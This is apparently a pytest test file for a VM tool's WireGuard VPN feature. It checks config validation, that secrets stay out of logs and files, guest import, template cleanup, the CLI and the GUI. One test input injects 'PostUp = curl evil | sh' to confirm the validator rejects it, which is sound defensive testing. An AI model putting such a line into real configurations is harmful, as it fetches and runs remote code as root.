# SPDX-License-Identifier: GPL-3.0-or-later
"""Bony's VPN in Bony's Agents: Erstellen mit .conf, Detailansicht, Kommandozeile, Vorlagen.

Alle Schlüssel hier sind Wegwerf-Schlüssel (Zufall je Testlauf). Kernfrage: Landet ein Schlüssel
irgendwo auf dem Host außer im Seed-ISO – und ist das ISO nach der Einrichtung weg?
"""

import base64
import io
import json
import os
import stat
import subprocess
import sys
import textwrap
from pathlib import Path
from types import SimpleNamespace

import pycdlib
import pytest

from bonys_agents import apps, cli, cloudinit, qemu, templates, vm, vpnlink


def dummy_key() -> str:
    return base64.b64encode(os.urandom(32)).decode()


PRIV, PUB, PSK = dummy_key(), dummy_key(), dummy_key()
SECRETS = (PRIV, PSK)
CONF = textwrap.dedent(f"""\
    [Interface]
    PrivateKey = {PRIV}
    Address = 10.8.0.2/24
    DNS = 10.8.0.1

    [Peer]
    PublicKey = {PUB}
    PresharedKey = {PSK}
    AllowedIPs = 0.0.0.0/0, ::/0
    Endpoint = vpn.example.net:51820
    """)


def no_secret(text) -> bool:
    if isinstance(text, bytes):
        return not any(s.encode() in text for s in SECRETS)
    return not any(s in str(text) for s in SECRETS)


@pytest.fixture
def conf_file(tmp_path):
    p = tmp_path / "eingabe" / "fritz box.conf"
    p.parent.mkdir()
    p.write_text(CONF)
    p.chmod(0o600)
    return p


def iso_files(path: Path) -> dict[str, bytes]:
    iso = pycdlib.PyCdlib()
    iso.open(str(path))
    out = {}
    for _dirname, _dirs, files in iso.walk(rr_path="/"):
        for f in files:
            buf = io.BytesIO()
            iso.get_file_from_iso_fp(buf, rr_path="/" + f)
            out[f] = buf.getvalue()
    iso.close()
    return out


# ---------------------------------------------------------------- Konfiguration lesen
def test_load_conf_validates_like_the_helper(conf_file):
    s = vpnlink.load_conf(conf_file, autoconnect=True, killswitch=True)
    assert (s.name, s.endpoint, s.autoconnect, s.killswitch) == ("fritz_box", "vpn.example.net:51820", True, True)
    assert s.data == CONF.encode()
    assert no_secret(repr(s)) and "data" not in repr(s)
    assert vpnlink.load_conf(conf_file, name="heim").name == "heim"


@pytest.mark.parametrize("content, match", [
    (CONF.replace(PRIV, "A" * 44), "keine gültige"),
    (CONF.replace("[Peer]", "PostUp = curl evil | sh\n[Peer]"), "als root"),
    ("x" * (70 * 1024), "zu groß"),
    ("", "keine gültige"),
    (CONF.replace("Endpoint = vpn.example.net:51820", "Endpoint = vpn.example.net:99999"), "keine gültige"),
])
def test_load_conf_errors_never_show_values(tmp_path, content, match):
    p = tmp_path / "x.conf"
    p.write_text(content)
    with pytest.raises(ValueError, match=match) as e:
        vpnlink.load_conf(p)
    assert no_secret(str(e.value))


def test_load_conf_bad_name_and_missing_file(conf_file, tmp_path):
    with pytest.raises(ValueError, match="Tunnelname"):
        vpnlink.load_conf(conf_file, name="viel-zu-lang-fuer-wg0")
    with pytest.raises(ValueError, match="nicht lesen"):
        vpnlink.load_conf(tmp_path / "fehlt.conf")


# ---------------------------------------------------------------- Seed-ISO und Einrichtung
def _guest(setup=None, app_ids=("vpn",)):
    return cloudinit.GuestConfig(hostname="pc", username="agent", password="geheim1", apps=apps.resolve(list(app_ids)),
                                 vpn=setup)


def test_seed_iso_carries_the_conf_only_as_its_own_file(conf_file, tmp_path):
    setup = vpnlink.load_conf(conf_file, autoconnect=True)
    iso = tmp_path / "seed.iso"
    cloudinit.write_seed_iso(iso, _guest(setup), "bonys-test")
    files = iso_files(iso)
    assert files[vpnlink.SEED_FILE] == CONF.encode()
    assert no_secret(files["user-data"]) and no_secret(files["meta-data"])
    if sys.platform != "win32":
        assert stat.S_IMODE(iso.stat().st_mode) == 0o600  # enthält Passwort und Schlüssel
    cloudinit.write_seed_iso(iso, _guest(None), "bonys-test")  # ohne VPN: keine Datei
    assert vpnlink.SEED_FILE not in iso_files(iso)


def test_provision_imports_after_all_steps(conf_file):
    setup = vpnlink.load_conf(conf_file, autoconnect=True, killswitch=True)
    script = cloudinit.provision_script(_guest(setup, ("brave", "vpn", "hermes")))
    assert no_secret(script)
    last_step = script.rindex(cloudinit.STEP_MARKER)
    imp = script.index(f"bonys-vpn-helper import {setup.name} --replace")
    assert last_step < imp < script.index('touch "$STATE/ready"')  # nach Hermes & Co., vor „fertig“
    assert imp < script.index("autostart fritz_box on") < script.index("killswitch on")
    assert subprocess.run(["bash", "-n"], input=script, text=True).returncode == 0
    plain = cloudinit.provision_script(_guest(None, ("brave", "vpn")))
    assert "bonys-vpn-helper import" not in plain


def _fake_bin(tmp_path: Path, seed: Path) -> Path:
    """blkid, mount und umount als Attrappen: „Einhängen“ kopiert den Inhalt des Seed-Ordners."""
    b = tmp_path / "bin"
    b.mkdir()
    tools = {
        "blkid": 'echo /dev/sr0',
        "mount": f'[ "$1 $2 $3" = "-o ro /dev/sr0" ] || exit 1; cp "{seed}"/* "$4"/',
        "umount": 'rm -f "$1"/*',
    }
    for name, body in tools.items():
        (b / name).write_text(f"#!/bin/sh\n{body}\n")
        (b / name).chmod(0o755)
    return b


def _fake_helper(tmp_path: Path, fail_import=False) -> Path:
    h = tmp_path / "bonys-vpn-helper"
    log = tmp_path / "helper.log"
    h.write_text(textwrap.dedent(f"""\
        #!/bin/sh
        echo "$*" >> "{log}"
        if [ "$1" = import ]; then
          cat > "{tmp_path}/importiert.conf"
          {"exit 1" if fail_import else ""}
          echo '{{"name": "x"}}'
        fi
        """))
    h.chmod(0o755)
    return h


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX-Shell")
@pytest.mark.parametrize("fail", [False, True])
def test_guest_import_script_with_fake_helper(conf_file, tmp_path, fail):
    seed = tmp_path / "seed"
    seed.mkdir()
    (seed / vpnlink.SEED_FILE).write_bytes(CONF.encode())
    (seed / "user-data").write_text("#cloud-config\n")
    helper = _fake_helper(tmp_path, fail_import=fail)
    done = tmp_path / "state" / "vpn-config.done"
    setup = vpnlink.load_conf(conf_file, autoconnect=True, killswitch=True)
    script = vpnlink.guest_import_script(setup, helper=str(helper), done_file=str(done))
    env = dict(os.environ, PATH=f"{_fake_bin(tmp_path, seed)}:{os.environ['PATH']}")
    out = subprocess.run(["sh", "-c", script], env=env, capture_output=True, text=True)
    assert out.returncode == 0 and no_secret(out.stdout + out.stderr)
    calls = (tmp_path / "helper.log").read_text().splitlines()
    assert (tmp_path / "importiert.conf").read_bytes() == CONF.encode()  # über stdin, nicht als Pfad
    if fail:
        assert calls == ["import fritz_box --replace"] and not done.exists()
        assert "WARNUNG" in out.stdout
        return
    assert calls == ["import fritz_box --replace", "autostart fritz_box on", "killswitch on"]
    assert done.exists() and "Kill-Switch ist an" in out.stdout
    again = subprocess.run(["sh", "-c", script], env=env, capture_output=True, text=True)  # schon erledigt
    assert again.stdout == "" and len((tmp_path / "helper.log").read_text().splitlines()) == 3


def test_clone_first_boot_imports_too(conf_file):
    setup = vpnlink.load_conf(conf_file)
    data = cloudinit.clone_user_data("pc", "agent", "geheim1", setup)
    assert no_secret(data) and "bonys-vpn-helper import fritz_box" in data and "autostart" not in data
    assert "bonys-vpn-helper" not in cloudinit.clone_user_data("pc", "agent", "geheim1")
    script = cloudinit.clone_firstboot_script(setup)
    assert script.index("bonys-vpn-helper import") < script.index(cloudinit.READY_MARKER)
    assert subprocess.run(["sh", "-n"], input=script, text=True).returncode == 0


# ---------------------------------------------------------------- Kein Schlüssel auf dem Host
def _all_files(*roots: Path) -> list[Path]:
    return [f for r in roots if r.exists() for f in r.rglob("*") if f.is_file()]


def test_create_writes_the_key_only_into_the_seed_iso(datadir, monkeypatch, tmp_path, conf_file):
    base = tmp_path / "base.img"
    base.write_bytes(b"img")
    monkeypatch.setattr(vm.images, "ensure_image", lambda image, d, cb, reuse_from=None: base)
    monkeypatch.setattr(vm.qemu, "find_binary", lambda name, os_: Path("/bin/true"))
    monkeypatch.setattr(vm.qemu, "create_disk", lambda qi, b, disk, gb: disk.write_bytes(b"disk"))
    messages = []
    setup = vpnlink.load_conf(conf_file, autoconnect=True, killswitch=True)
    m = vm.create("vpn-pc", "pw1234", app_ids=["brave"], progress=lambda *a: messages.append(a), vpn=setup)
    assert "vpn" in m.config.apps  # Bony's VPN kommt automatisch mit
    assert no_secret(messages) and no_secret(m.path.joinpath("vm.json").read_text())
    assert iso_files(m.seed_iso)[vpnlink.SEED_FILE] == CONF.encode()
    roots = (datadir, m.path, tmp_path)
    leaks = [f for f in _all_files(*roots) if f not in (m.seed_iso, conf_file) and not no_secret(f.read_bytes())]
    assert leaks == []
    # Vorlagen-Metadaten (template.json) aus diesem Agent-PC
    t = templates.Template(path=tmp_path / "tpl", name="t", apps=list(m.config.apps), source=m.name)
    t.path.mkdir()
    t.save()
    assert no_secret((t.path / "template.json").read_bytes())
    # Einrichtung fertig → Seed-ISO weg, danach nirgends mehr ein Schlüssel (außer in der Eingabedatei)
    m.console_log.write_text(f"{cloudinit.STEP_MARKER} 1/2 x\n{cloudinit.READY_MARKER}\n")
    assert m.progress().ready and not m.seed_iso.exists()
    leaks = [f for f in _all_files(*roots) if f != conf_file and not no_secret(f.read_bytes())]
    assert leaks == []


def test_create_from_template_needs_the_vpn_app(datadir, monkeypatch, conf_file, tmp_path):
    tpl = templates.Template(path=tmp_path, name="ohne", apps=["brave"], arch="x86_64")
    monkeypatch.setattr(templates, "get", lambda name: tpl)
    with pytest.raises(ValueError, match="nicht installiert"):
        vm.create("klon", "pw1234", template="ohne", vpn=vpnlink.load_conf(conf_file))


# ---------------------------------------------------------------- Vorlagen
def test_generalize_resets_vpn_only_when_fresh():
    fresh = cloudinit.generalize_script("agent", remove_personal=True)
    clone = cloudinit.generalize_script("agent", remove_personal=False)
    assert cloudinit.VPN_CLEANUP in fresh and cloudinit.VPN_CLEANUP not in clone
    assert "/var/lib/bonys-agents/vpn-config.done" in fresh and "/var/lib/bonys-agents/vpn-config.done" in clone
    for s in (fresh, clone, cloudinit.generalize_script("agent", True, dry_run=True)):
        assert subprocess.run(["bash", "-n"], input=s, text=True).returncode == 0


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX-Shell")
@pytest.mark.parametrize("dry", [False, True])
def test_vpn_cleanup_with_fake_system(tmp_path, dry):
    wg, state, b = tmp_path / "wireguard", tmp_path / "bonys-vpn", tmp_path / "bin"
    for d in (wg, state, b):
        d.mkdir()
    (wg / "fritz.conf").write_text(CONF)
    (wg / "privatekey").write_text(PRIV + "\n")
    (state / "killswitch.nft").write_text("table inet bonys_vpn {}\n")
    (state / "killswitch.json").write_text(json.dumps(
        {"enabled": True, "exceptions": ["10.0.2.0/24"], "resolved": {"vpn.example.net": ["198.51.100.7"]}}))
    log = tmp_path / "calls.log"
    for tool in ("systemctl", "nft"):
        (b / tool).write_text(f'#!/bin/sh\necho "{tool} $*" >> "{log}"\nexit 0\n')
        (b / tool).chmod(0o755)
    wipe = textwrap.dedent("""\
        wipe() {
          for p in "$@"; do
            [ -e "$p" ] || [ -L "$p" ] || continue
            if [ "$DRY" = 1 ]; then echo "WÜRDE LÖSCHEN: $p"; else rm -rf "$p" && echo "gelöscht: $p"; fi
          done
        }
        """)
    body = cloudinit.VPN_CLEANUP.replace("/etc/wireguard", str(wg)).replace("/etc/bonys-vpn", str(state))
    env = dict(os.environ, PATH=f"{b}:{os.environ['PATH']}")
    out = subprocess.run(["bash", "-c", f"DRY={int(dry)}\n{wipe}{body}"], env=env, capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    assert no_secret(out.stdout + out.stderr)
    calls = log.read_text()
    if dry:
        assert sorted(p.name for p in wg.iterdir()) == ["fritz.conf", "privatekey"]
        assert "WÜRDE LÖSCHEN" in out.stdout and "WÜRDE AUSSCHALTEN: Kill-Switch" in out.stdout
        assert "disable" not in calls
        return
    assert list(wg.iterdir()) == []
    assert "systemctl disable --now wg-quick@fritz" in calls and "systemctl disable bonys-vpn-killswitch" in calls
    assert "nft delete table inet bonys_vpn" in calls and not (state / "killswitch.nft").exists()
    assert json.loads((state / "killswitch.json").read_text()) == {"enabled": False, "exceptions": ["10.0.2.0/24"],
                                                                  "resolved": {}}


def test_template_dialog_texts():
    pytest.importorskip("PySide6.QtWidgets")
    from bonys_agents.gui.template_dialogs import deletion_text

    assert vpnlink.FRESH_CLEANUP in deletion_text("agent", True, vpn=True)
    assert vpnlink.CLONE_WARNING in deletion_text("agent", False, vpn=True)
    assert vpnlink.CLONE_WARNING not in deletion_text("agent", False, vpn=False)


def test_cli_template_create_lists_vpn(datadir, monkeypatch, capsys):
    machine = SimpleNamespace(name="pc", config=SimpleNamespace(username="agent", apps=["vpn"]),
                              is_running=lambda: False)
    monkeypatch.setattr(vm, "get", lambda name: machine)
    for flags, text in (([], vpnlink.FRESH_CLEANUP), (["--keep-personal-data"], vpnlink.CLONE_WARNING)):
        monkeypatch.setattr("builtins.input", lambda q: "nein")
        assert cli.main(["template", "create", "pc", "t", *flags]) == 1  # „Abgebrochen“ bei der Rückfrage
        assert text in capsys.readouterr().out


# ---------------------------------------------------------------- Laufender Agent-PC
class FakeGA:
    calls: list = []
    reply = (0, "", "")
    fail = False

    def __init__(self, port, timeout=5):
        if FakeGA.fail:
            raise qemu.GuestAgentError("weg")

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        pass

    def exec(self, path, args, stdin=None, timeout=120):
        FakeGA.calls.append((path, args, stdin))
        r = FakeGA.reply
        return r(path, args) if callable(r) else r


@pytest.fixture
def ga(monkeypatch):
    FakeGA.calls, FakeGA.reply, FakeGA.fail = [], (0, "", ""), False
    monkeypatch.setattr(qemu, "GuestAgent", FakeGA)
    return FakeGA


def fake_machine(**over):
    m = SimpleNamespace(name="pc", is_running=lambda: True, runtime=lambda: {"qga_port": 1},
                        config=SimpleNamespace(username="agent", apps=["vpn"]))
    for k, v in over.items():
        setattr(m, k, v)
    return m


STATUS = {"tunnels": [{"name": "fritz", "active": True, "autostart": True, "addresses": ["10.8.0.2/24"],
                       "peers": [{"endpoint": "vpn.example.net:51820"}], "handshake": 0, "rx": 2048, "tx": 1024}],
          "active": "fritz", "killswitch": {"enabled": True, "active": True, "exceptions": ["10.0.2.0/24"]}}


def test_status_uses_bonys_vpn_json(ga):
    ga.reply = (0, json.dumps(STATUS), "")
    st = vpnlink.status(fake_machine())
    path, args, _stdin = ga.calls[0]
    assert path == "/bin/sh" and "bonys-vpn status --json" in args[1]
    assert st["installed"] and vpnlink.default_tunnel(st) == "fritz"
    assert vpnlink.summary(st) == "verbunden – Tunnel „fritz“ · Kill-Switch an"
    ga.reply = (0, '{"installed": false}\n', "")
    assert vpnlink.summary(vpnlink.status(fake_machine())) == "Bony's VPN ist nicht installiert."


def test_default_tunnel():
    t = [{"name": "a"}, {"name": "b", "autostart": True}]
    assert vpnlink.default_tunnel({"tunnels": t}) == "b"
    assert vpnlink.default_tunnel({"tunnels": t[:1]}) == "a"
    assert vpnlink.default_tunnel({"tunnels": [{"name": "a"}, {"name": "c"}]}) is None


def test_import_goes_over_stdin_and_errors_are_scrubbed(ga, conf_file):
    setup = vpnlink.load_conf(conf_file, autoconnect=True, killswitch=True)
    vpnlink.import_conf(fake_machine(), setup, replace=True)
    assert ga.calls[0] == (vpnlink.GUEST_HELPER, ["import", "fritz_box", "--replace"], CONF.encode())
    assert [c[1] for c in ga.calls[1:]] == [["autostart", "fritz_box", "an"], ["killswitch", "an"]]
    assert all(c[2] == b"" for c in ga.calls[1:])  # Schlüssel nur beim Import
    ga.reply = (1, "", f"Fehler: Zeile 2: PrivateKey ungültig {PRIV}")
    with pytest.raises(vpnlink.VpnError) as e:
        vpnlink.up(fake_machine(), "fritz")
    assert "PrivateKey ungültig" in str(e.value) and no_secret(str(e.value))
    with pytest.raises(ValueError):
        vpnlink.up(fake_machine(), "../etc/x")


def test_without_guest_agent_needs_password_then_ssh(ga):
    ga.fail = True
    with pytest.raises(vm.NeedsPassword):
        vpnlink.status(fake_machine())
    sent = []

    def ssh(cmd, script, password, log):
        sent.append((cmd, script, password))
        log(json.dumps(STATUS))
        return 0

    st = vpnlink.status(fake_machine(_ssh=ssh), password="pw")
    assert st["active"] == "fritz" and sent[0][0].startswith("sudo /bin/sh -c ") and sent[0][2] == "pw"


def test_public_ip(ga):
    ga.reply = (0, "198.51.100.7\n", "")
    assert vpnlink.public_ip(fake_machine()) == "198.51.100.7"
    assert "runuser -u agent -- curl" in ga.calls[0][1][1]
    ga.reply = (7, "", "curl: (7) Failed to connect")
    with pytest.raises(vpnlink.VpnError, match="Kein Internet"):
        vpnlink.public_ip(fake_machine())
    ga.reply = (0, "<html>", "")
    with pytest.raises(vpnlink.VpnError, match="Unerwartete"):
        vpnlink.public_ip(fake_machine())


# ---------------------------------------------------------------- Kommandozeile
def test_cli_create_vpn_options(conf_file, capsys):
    parse = cli.build_parser().parse_args
    s = cli.vpn_setup(parse(["create", "pc", "--vpn-config", str(conf_file), "--killswitch"]))
    assert (s.name, s.autoconnect, s.killswitch) == ("fritz_box", False, True)
    out = capsys.readouterr().out
    assert "Kill-Switch ohne automatisches Verbinden" in out and no_secret(out)
    assert cli.vpn_setup(parse(["create", "pc"])) is None
    assert cli.main(["create", "pc", "--killswitch"]) == 1
    assert "nur zusammen mit --vpn-config" in capsys.readouterr().err
    bad = conf_file.with_name("kaputt.conf")
    bad.write_text(CONF.replace(PRIV, "A" * 44))
    assert cli.main(["create", "pc", "--vpn-config", str(bad)]) == 1
    assert no_secret(capsys.readouterr().err)


def test_cli_vpn_commands(monkeypatch, capsys, conf_file):
    machine = fake_machine()
    monkeypatch.setattr(vm, "get", lambda name: machine)
    calls = []
    monkeypatch.setattr(vpnlink, "status", lambda m, **kw: calls.append(("status", kw)) or STATUS)
    for fn in ("up", "down", "set_killswitch", "set_autostart", "import_conf"):
        monkeypatch.setattr(vpnlink, fn, lambda m, *a, _fn=fn, **kw: calls.append((_fn, a, kw)))
    assert cli.main(["vpn", "pc", "status"]) == 0
    out = capsys.readouterr().out
    assert "verbunden – Tunnel „fritz“" in out and "Ausnahmen: 10.0.2.0/24" in out
    assert cli.main(["vpn", "pc", "status", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["active"] == "fritz"
    calls.clear()
    assert cli.main(["vpn", "pc", "up"]) == 0
    assert calls[-1] == ("up", ("fritz",), {"ssh_prompt": True})
    assert cli.main(["vpn", "pc", "down"]) == 0 and calls[-1][0:2] == ("down", (None,))
    assert cli.main(["vpn", "pc", "killswitch", "on"]) == 0 and calls[-1][0:2] == ("set_killswitch", (True,))
    assert cli.main(["vpn", "pc", "killswitch", "aus"]) == 0 and calls[-1][0:2] == ("set_killswitch", (False,))
    assert cli.main(["vpn", "pc", "killswitch"]) == 1
    assert cli.main(["vpn", "pc", "import", str(conf_file), "--tunnel", "heim"]) == 0
    name, (setup,), kw = calls[-1]
    assert name == "import_conf" and setup.name == "heim" and kw["replace"] is False
    out, err = capsys.readouterr()
    assert no_secret(out + err)


# ---------------------------------------------------------------- Oberfläche
@pytest.fixture
def qapp():
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PySide6.QtWidgets")
    return QtWidgets.QApplication.instance() or QtWidgets.QApplication([])


def test_create_dialog_vpn_section(qapp, datadir, monkeypatch, conf_file):
    from bonys_agents import host
    from bonys_agents.gui import create_dialog

    captured = {}

    class Worker:
        def __init__(self, params):
            captured.update(params)
            self.progress = self.finished_ok = self.failed = SimpleNamespace(connect=lambda f: None)

        def start(self):
            pass

        def isRunning(self):  # noqa: N802
            return True

    monkeypatch.setattr(create_dialog, "CreateWorker", Worker)
    dlg = create_dialog.CreateDialog(host.HostInfo(os="linux", arch="x86_64", cpus=4, ram_mb=16384, accel="kvm"))
    assert not dlg.vpn_box.isChecked() and dlg.vpn_opts.isHidden()
    assert not dlg.vpn_auto.isEnabled() and not dlg.vpn_kill.isEnabled()  # ohne Datei keine Schalter
    dlg._set_vpn_conf(vpnlink.load_conf(conf_file))
    assert dlg.vpn_box.isChecked() and dlg.vpn_auto.isChecked() and dlg.vpn_kill.isEnabled()
    assert "fritz_box" in dlg.vpn_info.text() and no_secret(dlg.vpn_info.text())
    dlg.vpn_auto.setChecked(False)
    dlg.vpn_kill.setChecked(True)
    assert "Kill-Switch ohne automatisches Verbinden" in dlg.vpn_info.text()
    dlg.pw1.setText("pw1234")
    dlg.pw2.setText("pw1234")
    dlg._create()
    v = captured["vpn"]
    assert (v.name, v.autoconnect, v.killswitch, v.data) == ("fritz_box", False, True, CONF.encode())
    assert "vpn" in captured["app_ids"]
    dlg._set_vpn_conf(None)
    assert not dlg.vpn_kill.isChecked() and not dlg.vpn_kill.isEnabled()


def test_vpn_panel_shows_status(qapp, monkeypatch):
    from bonys_agents.gui.vpn_panel import VpnPanel, tunnel_details

    machine = fake_machine(status=lambda: "läuft", path=Path("/x/pc"))
    panel = VpnPanel()
    monkeypatch.setattr(panel, "reload", lambda quiet=False: None)
    panel.update_for(machine, "läuft")
    assert "Frage den Status" in panel.note.text() and not panel.up_btn.isEnabled()
    panel.state = dict(STATUS, installed=True)
    panel._show()
    assert "verbunden – „fritz“" in panel.headline.text()
    assert not panel.up_btn.isEnabled() and panel.down_btn.isEnabled() and panel.import_btn.isEnabled()
    assert panel.killswitch.isChecked() and panel.autostart.isChecked()
    assert "vpn.example.net:51820" in tunnel_details(STATUS["tunnels"][0])
    panel.state = dict(STATUS, active=None, installed=True,
                       tunnels=[dict(STATUS["tunnels"][0], active=False, autostart=False)])
    panel._show()
    assert "getrennt" in panel.headline.text() and "kein Internet" in panel.note.text()
    assert panel.up_btn.isEnabled() and not panel.down_btn.isEnabled()
    # Ohne Bony's VPN: Knopf zum Nachinstallieren
    other = fake_machine(status=lambda: "läuft", path=Path("/x/pc2"), config=SimpleNamespace(username="agent", apps=[]))
    panel.update_for(other, "läuft")
    assert not panel.install_btn.isHidden() and panel.install_btn.isEnabled() and panel.body.isHidden()
    panel.update_for(fake_machine(status=lambda: "gestoppt", path=Path("/x/pc2"),
                                  config=SimpleNamespace(username="agent", apps=[])), "gestoppt")
    assert not panel.install_btn.isEnabled()


def test_template_work_copy_overwrites_free_space_with_zeros():
    """fstrim gibt nur ganze qcow2-Cluster frei – gelöschte Schlüssel in halb belegten Clustern blieben sonst."""
    s = cloudinit.generalize_script("agent", remove_personal=True)
    zero = s.index("dd if=/dev/zero of=/var/tmp/bonys-zero")
    assert s.index(cloudinit.VPN_CLEANUP) < zero < s.index("fstrim -av") < s.index("BONYS-GENERALIZED")
    assert "if ! fstrim" not in s  # Nullen immer, nicht nur, wenn fstrim fehlschlägt
    assert templates._WorkVM.zero_unmap and not vm.VM.zero_unmap
